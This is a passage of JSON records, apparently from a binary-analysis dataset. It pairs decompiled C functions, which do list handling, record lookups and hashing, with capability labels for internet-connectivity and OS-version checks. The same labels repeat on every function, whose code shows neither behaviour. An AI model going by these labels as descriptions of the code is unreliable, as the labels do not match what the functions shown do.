        "decompiled_code": "\nint32_t __cdecl fcn.00022260(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023940(&var_10h, arg_8h, 0, &var_ch);\n        if (var_4h == 0) {\n            fcn.00023d60(var_10h, &arg_ch);\n            arg_8h_01 = *(var_10h + 0x34);\n            arg_8h_00 = fcn.00022f10(arg_8h_01, arg_ch, arg_10h);\n            iVar1 = fcn.00023060(arg_8h_00, arg_8h_01);\n            if (iVar1 == -1) {\n                var_4h = 5;\n            }\n            else {\n                iVar1 = (**(*(var_10h + 0x44) + 0x14))(*(var_10h + 0x48), arg_18h, 0x40, iVar1);\n                if (iVar1 == -1) {\n                    var_4h = 3;\n                }\n                else {\n                    var_4h = 0;\n                }\n            }\n            fcn.00023a70(&var_ch);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 388
    },
    "00022320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022320(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_18h == 0) {\n        var_8h = -1;\n    }\n    else {\n        var_8h = fcn.00023940(&var_18h, arg_8h, 0, &var_10h);\n        if (var_8h == 0) {\n            fcn.00023d60(var_18h, &arg_ch);\n            var_8h = 5;\n            var_4h = fcn.00022f10(*(var_18h + 0x34), arg_ch, arg_10h);\n            if (var_4h != 0) {\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    if ((arg_14h == NULL) || (*(var_14h + 8) == *arg_14h)) {\n                        iVar1 = (**(*(var_18h + 0x44) + 0x14))(*(var_18h + 0x48), arg_18h, 0x40, *(var_14h + 0xc));\n                        if (iVar1 == 0) {\n                            var_8h = 0;\n                        }\n                        break;\n                    }\n                }\n            }\n            fcn.00023a70(&var_10h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 418
    },
    "00022400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022400(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_14h == NULL) {\n        return -1;\n    }\n    var_8h = fcn.00023940(&var_18h, arg_8h, 0, &var_10h);\n    if (var_8h != 0) {\n        return var_8h;\n    }\n    fcn.00023d60(var_18h, &arg_ch);\n    if (arg_18h != NULL) {\n        *arg_18h = 0;\n    }\n    *arg_14h = 0;\n    var_4h = fcn.00022f10(*(var_18h + 0x34), arg_ch, arg_10h);\n    if (var_4h != 0) {\n        for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n            *arg_14h = *arg_14h + 1;\n        }\n        if ((arg_18h != NULL) && (*arg_14h != 0)) {\n            iVar1 = fcn.00035200(*arg_14h << 6);\n            *arg_18h = iVar1;\n            if (*arg_18h == 0) {\n                var_8h = 2;\n                goto code_r0x000226b3;\n            }\n            if (((*arg_14h < 2) || (**(var_18h + 0x44) <= (*(var_18h + 0x44) + 0x20) - *(var_18h + 0x44))) ||\n               (*(*(var_18h + 0x44) + 0x20) == 0)) {\n                *arg_14h = 0;\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    iVar1 = (**(*(var_18h + 0x44) + 0x14))\n                                      (*(var_18h + 0x48), *arg_14h * 0x40 + *arg_18h, 0x40, *(var_14h + 0xc));\n                    if (iVar1 == -1) {\n                        var_8h = 3;\n                        fcn.00035330(*arg_18h);\n                        *arg_18h = 0;\n                        *arg_14h = 0;\n                        goto code_r0x000226b3;\n                    }\n                    *arg_14h = *arg_14h + 1;\n                }\n            }\n            else {\n                iVar1 = fcn.000352f0(*arg_14h, 0xc);\n                if (iVar1 == 0) {\n                    var_8h = 2;\n                    goto code_r0x000226b3;\n                }\n                *arg_14h = 0;\n                for (var_14h = *(var_4h + 0x10); var_14h != 0; var_14h = *(var_14h + 0x14)) {\n                    *(iVar1 + *arg_14h * 0xc) = *arg_14h * 0x40 + *arg_18h;\n                    *(iVar1 + 4 + *arg_14h * 0xc) = *(var_14h + 0xc);\n                    *(iVar1 + 8 + *arg_14h * 0xc) = 0x40;\n                    *arg_14h = *arg_14h + 1;\n                }\n                iVar2 = (**(*(var_18h + 0x44) + 0x20))(*(var_18h + 0x48), iVar1, *arg_14h);\n                if (iVar2 != 0) {\n                    var_8h = 3;\n                    fcn.00035330(iVar1);\n                    fcn.00035330(*arg_18h);\n                    *arg_18h = 0;\n                    *arg_14h = 0;\n                    goto code_r0x000226b3;\n                }\n                fcn.00035330(iVar1);\n            }\n        }\n    }\n    var_8h = 0;\ncode_r0x000226b3:\n    fcn.00023a70(&var_10h);\n    return var_8h;\n}\n",
        "token_count": 1097
    },
    "000226d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.000226d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, int32_t arg_1ch, uint arg_20h)\n\n{\n    uint var_10h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_18h == 0) && (arg_1ch != 0)) {\n        var_4h = -1;\n    }\n    else {\n        var_4h = fcn.00023940(0, arg_8h, 5, &var_10h);\n        if (var_4h == 0) {\n            var_4h = fcn.000220a0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_8h);\n            if ((var_4h == 0) &&\n               (var_4h = fcn.00021f40(arg_8h, arg_ch, arg_10h, var_8h, 0, arg_18h, arg_1ch),  var_4h != 0)) {\n                fcn.00021ad0(arg_8h, arg_ch, arg_10h, var_8h);\n            }\n            fcn.00023a70(&var_10h);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 327
    },
    "00022790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00022790(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    var_4h = fcn.00023940(&var_10h, arg_8h, 0, &var_ch);\n    if (var_4h == 0) {\n        *(var_10h + 100) = arg_ch;\n        *(var_10h + 0x68) = arg_10h;\n        *(var_10h + 0x60) = 1;\n        fcn.00023a70(&var_ch);\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 174
    },
    "000227f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000227f0(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_1ch;\n    uint var_14h;\n    char *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == '\\0')) {\n        var_ch = 0;\n    }\n    else {\n        var_10h = arg_8h;\n        do {\n            cVar1 = *var_10h;\n            var_10h = var_10h + 1;\n        } while (cVar1 != '\\0');\n        var_ch = 0;\n        for (var_8h = 0; var_8h < var_10h - (arg_8h + 1); var_8h = var_8h + 1) {\n            var_ch = var_ch << 3 ^ arg_8h[var_8h];\n        }\n        var_ch = (var_10h - (arg_8h + 1)) + 1U & 0xffff ^ var_ch;\n        if (var_ch == 0) {\n            var_ch = 0xffffffff;\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 287
    },
    "000228a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000228a0(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t *var_88h;\n    int32_t *var_84h;\n    uint32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_4ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_38h = 0;\n    var_7ch = 0;\n    if (arg_8h == 0) {\n        return -1;\n    }\n    fcn.00022bc0(arg_8h);\n    puVar3 = arg_8h + 8;\n    puVar4 = &var_34h;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if (*(arg_8h + 8) <= *(arg_8h + 0x1c) && *(arg_8h + 0x1c) != *(arg_8h + 8)) {\n        *(arg_8h + 0x1c) = *(arg_8h + 8);\n        iVar2 = fcn.00023aa0(arg_8h, 0);\n        if (iVar2 != 0) {\n            var_4h = 3;\n            goto code_r0x00022b94;\n        }\n    }\n    for (var_8h = 0x2c; var_8h < *(arg_8h + 0x1c); var_8h = var_8h + 0x40 + var_4ch) {\n        iVar2 = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_78h, 0x40, var_8h);\n        if (iVar2 != 0) {\n            var_4h = 3;\n            goto code_r0x00022b94;\n        }\n        if (((*(arg_8h + 0x1c) <= var_8h + 0x40 && var_8h + 0x40 != *(arg_8h + 0x1c)) ||\n            (var_8h + 0x40 + var_4ch <= var_8h)) ||\n           (uVar1 = var_8h + 0x40 + var_4ch,  *(arg_8h + 0x1c) <= uVar1 && uVar1 != *(arg_8h + 0x1c))) break;\n        if (var_70h == 0xffff) {\n            var_38h = var_38h + 1;\n        }\n        else {\n            var_7ch = var_7ch + 1;\n            var_4h = fcn.00022ca0(arg_8h, var_78h, var_70h, var_74h);\n            if (var_4h != 0) goto code_r0x00022b94;\n            var_4h = fcn.00022da0(arg_8h, var_78h, var_70h, var_74h, var_6ch, var_8h, var_4ch);\n            if (var_4h != 0) goto code_r0x00022b94;\n        }\n    }\n    *(arg_8h + 0x18) = var_7ch;\n    *(arg_8h + 0x20) = var_38h;\n    *(arg_8h + 0x1c) = var_8h;\n    var_84h = &var_34h;\n    var_88h = arg_8h + 8;\n    for (var_80h = 0x2c; 3 < var_80h; var_80h = var_80h - 4) {\n        if (*var_88h != *var_84h) goto code_r0x00022a80;\n        var_84h = var_84h + 1;\n        var_88h = var_88h + 1;\n    }\n    if (var_80h == 0) {\ncode_r0x00022b40:\n        var_90h = 0;\n    }\n    else {\ncode_r0x00022a80:\n        var_8ch = *var_88h - *var_84h;\n        if (var_8ch == 0) {\n            if (var_80h == 1) goto code_r0x00022b40;\n            var_8ch = *(var_88h + 1) - *(var_84h + 1);\n            if (var_8ch == 0) {\n                if (var_80h == 2) goto code_r0x00022b40;\n                var_8ch = *(var_88h + 2) - *(var_84h + 2);\n                if (var_8ch == 0) {\n                    if ((var_80h == 3) || (var_8ch = *(var_88h + 3) - *(var_84h + 3),  var_8ch == 0))\n                    goto code_r0x00022b40;\n                }\n            }\n        }\n        var_90h = 1;\n        if (var_8ch < 1) {\n            var_90h = -1;\n        }\n    }\n    if ((var_90h != 0) && (iVar2 = fcn.00023aa0(arg_8h, 1),  iVar2 != 0)) {\n        var_4h = 3;\n    }\ncode_r0x00022b94:\n    if (var_4h != 0) {\n        puVar3 = &var_34h;\n        puVar4 = arg_8h + 8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 1519
    },
    "00022bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00022bc0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h != 0) {\n        while (*(arg_8h + 0x34) != 0) {\n            var_8h = *(*(arg_8h + 0x34) + 0x10);\n            while (var_8h != 0) {\n                if (*(var_8h + 0x18) == 0) {\n                    *(arg_8h + 0x38) = *(var_8h + 0x1c);\n                }\n                else {\n                    *(*(var_8h + 0x18) + 0x1c) = *(var_8h + 0x1c);\n                }\n                if (*(var_8h + 0x1c) == 0) {\n                    *(arg_8h + 0x3c) = *(var_8h + 0x18);\n                }\n                else {\n                    *(*(var_8h + 0x1c) + 0x18) = *(var_8h + 0x18);\n                }\n                iVar1 = *(var_8h + 0x14);\n                fcn.00035330(var_8h);\n                var_8h = iVar1;\n            }\n            arg_8h_00 = *(arg_8h + 0x34);\n            *(arg_8h + 0x34) = *(*(arg_8h + 0x34) + 0x18);\n            fcn.00035330(arg_8h_00);\n        }\n        *(arg_8h + 0x34) = 0;\n    }\n    return;\n}\n",
        "token_count": 416
    },
    "00022ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00022ca0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        for (var_4h = *(arg_8h + 0x34); var_4h != NULL; var_4h = var_4h[6]) {\n            if ((*var_4h == arg_ch) && (var_4h[1] == arg_10h)) {\n                if (var_4h[3] <= arg_14h && arg_14h != var_4h[3]) {\n                    var_4h[3] = arg_14h;\n                }\n                if (arg_14h < var_4h[2]) {\n                    var_4h[2] = arg_14h;\n                }\n                goto code_r0x00022d1d;\n            }\n        }\n        fcn.00022d30(arg_8h, arg_ch, arg_10h, arg_14h);\ncode_r0x00022d1d:\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 297
    },
    "00022d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00022d30(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint var_4h;\n    \n    puVar1 = fcn.00035200(0x1c);\n    if (puVar1 == NULL) {\n        puVar1 = NULL;\n    }\n    else {\n        *puVar1 = arg_ch;\n        puVar1[1] = arg_10h;\n        puVar1[2] = arg_14h;\n        puVar1[3] = arg_14h;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = *(arg_8h + 0x34);\n        *(arg_8h + 0x34) = puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 206
    },
    "00022da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00022da0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *arg_8h_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        arg_8h_00 = fcn.00035200(0x24);\n        if (arg_8h_00 == NULL) {\n            uVar2 = 2;\n        }\n        else {\n            arg_8h_00[3] = arg_1ch;\n            *arg_8h_00 = arg_14h;\n            arg_8h_00[1] = arg_20h;\n            arg_8h_00[2] = arg_18h;\n            var_ch = fcn.00022f10(*(arg_8h + 0x34), arg_ch, arg_10h);\n            if ((var_ch == 0) && (var_ch = fcn.00022d30(arg_8h, arg_ch, arg_10h, 0),  var_ch == 0)) {\n                fcn.00035330(arg_8h_00);\n                return 0xffffffff;\n            }\n            if (*(var_ch + 0x10) == 0) {\n                arg_8h_00[5] = 0;\n                arg_8h_00[4] = 0;\n                *(var_ch + 0x14) = arg_8h_00;\n                *(var_ch + 0x10) = arg_8h_00;\n            }\n            else {\n                iVar1 = *(var_ch + 0x14);\n                *(iVar1 + 0x14) = arg_8h_00;\n                arg_8h_00[5] = 0;\n                arg_8h_00[4] = iVar1;\n                *(var_ch + 0x14) = arg_8h_00;\n            }\n            if (*(arg_8h + 0x38) == 0) {\n                arg_8h_00[6] = 0;\n                arg_8h_00[7] = 0;\n                *(arg_8h + 0x3c) = arg_8h_00;\n                *(arg_8h + 0x38) = arg_8h_00;\n            }\n            else {\n                *(*(arg_8h + 0x3c) + 0x1c) = arg_8h_00;\n                arg_8h_00[6] = *(arg_8h + 0x3c);\n                arg_8h_00[7] = 0;\n                *(arg_8h + 0x3c) = arg_8h_00;\n            }\n            arg_8h_00[8] = var_ch;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 707
    },
    "00022f10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00022f10(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return NULL;\n        }\n        if ((*var_4h == arg_ch) && (var_4h[1] == arg_10h)) break;\n        var_4h = var_4h[6];\n    }\n    return var_4h;\n}\n",
        "token_count": 134
    },
    "00022fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00022fb0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if ((arg_ch < 0x40000001) && (arg_8h != 0)) {\n        fcn.00022bc0(arg_8h);\n        (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 2);\n        iVar2 = (**(*(arg_8h + 0x44) + 0xc))(*(arg_8h + 0x48), arg_ch);\n        if (iVar2 == 0) {\n            *(arg_8h + 8) = arg_ch;\n            iVar2 = fcn.00023aa0(arg_8h, 1);\n            if (iVar2 == 0) {\n                uVar1 = fcn.000228a0(arg_8h);\n                (**(*(arg_8h + 0x44) + 0x1c))(*(arg_8h + 0x48), 1);\n            }\n            else {\n                uVar1 = 3;\n            }\n        }\n        else {\n            fcn.000228a0(arg_8h);\n            uVar1 = 0xffffffff;\n        }\n    }\n    else {\n        uVar1 = 3;\n    }\n    return uVar1;\n}\n",
        "token_count": 323
    },
    "00023060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023060(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.000230b0(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        var_8h = 0xffffffff;\n    }\n    else if (*(iVar1 + 0xc) < 0x2c) {\n        var_8h = 0xffffffff;\n    }\n    else {\n        var_8h = *(iVar1 + 0xc);\n    }\n    return var_8h;\n}\n",
        "token_count": 142
    },
    "000230b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.000230b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = NULL;\n    }\n    else {\n        for (var_4h = *(arg_8h + 0x10); (var_4h != NULL && (*var_4h != arg_ch)); var_4h = var_4h[5]) {\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 126
    },
    "00023130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023130(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_58h;\n    uint var_50h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        return;\n    }\n    if (arg_ch == 0) {\n        return;\n    }\n    var_ch = fcn.000230b0(arg_ch, arg_10h);\n    if (var_ch == 0) {\n        return;\n    }\n    if (arg_14h != 0) {\n        var_14h = fcn.00023060(arg_ch, arg_10h);\n        if (var_14h == -1) {\n            return;\n        }\n        iVar1 = (**(*(arg_8h + 0x44) + 0x14))(*(arg_8h + 0x48), &var_58h, 0x40, var_14h);\n        if (iVar1 != 0) {\n            return;\n        }\n        var_4h = var_50h;\n        var_50h = 0xffff;\n        iVar1 = (**(*(arg_8h + 0x44) + 0x18))(*(arg_8h + 0x48), &var_58h, 0x40, var_14h);\n        if (iVar1 != 0) {\n            return;\n        }\n        *(arg_8h + 0x18) = *(arg_8h + 0x18) + -1;\n        *(arg_8h + 0x20) = *(arg_8h + 0x20) + 1;\n        if (arg_14h != 2) {\n            fcn.00023aa0(arg_8h, 1);\n        }\n    }\n    var_8h = *(var_ch + 0x10);\n    var_10h = *(var_ch + 0x14);\n    if (var_8h == 0) {\n        *(arg_ch + 0x10) = *(var_ch + 0x14);\n    }\n    else {\n        *(var_8h + 0x14) = var_10h;\n    }\n    if (var_10h == 0) {\n        *(arg_ch + 0x14) = var_8h;\n    }\n    else {\n        *(var_10h + 0x10) = var_8h;\n    }\n    if (*(var_ch + 0x18) == 0) {\n        *(arg_8h + 0x38) = *(var_ch + 0x1c);\n    }\n    else {\n        *(*(var_ch + 0x18) + 0x1c) = *(var_ch + 0x1c);\n    }\n    if (*(var_ch + 0x1c) == 0) {\n        *(arg_8h + 0x3c) = *(var_ch + 0x18);\n    }\n    else {\n        *(*(var_ch + 0x1c) + 0x18) = *(var_ch + 0x18);\n    }\n    fcn.00035330(var_ch);\n    if (arg_14h != 2) {\n        fcn.000232d0(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 783
    },
    "000232d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000232d0(int32_t arg_8h)\n\n{\n    uint32_t var_8h;\n    uint32_t *var_4h;\n    \n    if (arg_8h != 0) {\n        var_4h = *(arg_8h + 0x10);\n        if (var_4h == NULL) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = *var_4h;\n        }\n        *(arg_8h + 0xc) = var_8h;\n        *(arg_8h + 8) = var_8h;\n        for (; var_4h != NULL; var_4h = var_4h[5]) {\n            if (*var_4h < *(arg_8h + 8)) {\n                *(arg_8h + 8) = *var_4h;\n            }\n            if (*(arg_8h + 0xc) <= *var_4h && *var_4h != *(arg_8h + 0xc)) {\n                *(arg_8h + 0xc) = *var_4h;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "00023360": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023360(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = *(arg_8h + 0xc);\n    }\n    return var_4h;\n}\n",
        "token_count": 79
    },
    "00023390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00023390(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch == 0)) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        iVar3 = *(arg_ch + 0x2c) + 0x40;\n        if (arg_8h[2] <= arg_8h[7] + iVar3 && arg_8h[7] + iVar3 != arg_8h[2]) {\n            var_4h = fcn.00022f50(arg_8h, iVar3);\n            if (arg_8h[4] <= var_4h) {\n                fcn.000213b0(*arg_8h);\n                var_4h = fcn.00022f50(arg_8h, iVar3);\n                if (arg_8h[4] <= var_4h) {\n                    return 0xffffffff;\n                }\n            }\n            iVar2 = fcn.00022fb0(arg_8h, var_4h);\n            if (iVar2 != 0) {\n                fcn.000213b0(*arg_8h);\n                iVar2 = fcn.00022fb0(arg_8h, var_4h);\n                if (iVar2 != 0) {\n                    return 0xffffffff;\n                }\n            }\n        }\n        uVar1 = arg_8h[7];\n        iVar2 = (**(arg_8h[0x11] + 0x18))(arg_8h[0x12], arg_ch, 0x40, uVar1);\n        if (iVar2 == 0) {\n            arg_8h[7] = arg_8h[7] + iVar3;\n            arg_8h[6] = arg_8h[6] + 1;\n            iVar3 = fcn.00023aa0(arg_8h, 1);\n            if (iVar3 != 0) {\n                uVar1 = 0xffffffff;\n            }\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 517
    },
    "000234b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000234b0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00022f10(*(arg_8h + 0x34), arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0;\n        for (var_8h = *(iVar1 + 0x10); var_8h != 0; var_8h = *(var_8h + 0x14)) {\n            var_4h = var_4h + 0x40 + *(var_8h + 4);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 205
    },
    "00023810": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
